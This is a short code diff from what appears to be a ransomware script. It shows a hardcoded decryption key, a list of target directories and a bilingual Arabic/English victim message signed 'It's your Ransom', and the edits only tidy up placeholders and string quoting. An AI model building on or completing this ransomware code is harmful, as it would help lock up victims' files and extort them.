@@ -45,8 +45,6 @@ webforge.sys@gmail.com
 E-Mail: webforge.sys@gmail.com
 
 
-ENCRYPTED_HEADER
-
 """
 
 
@@ -84,7 +82,7 @@ directories = [d for d in directories1 if os.path.isdir(d)]
 
 dCode = "c41SqqB62dgIi7posUI156HE0hD7v838ja1o"  #   The Decryption Key
 
-decryption_message = """"
+decryption_message = """
          شطوووور! تم فك تشفير ملفاتك!
     ابقى خد بالك المره الجايه :)
 اتس يور رانسوم
@@ -95,8 +93,6 @@ decryption_message = """"
     Take care next time :>
 "It's your Ransom"
 
-
-ENCRYPTED_HEADER
 
         """
 
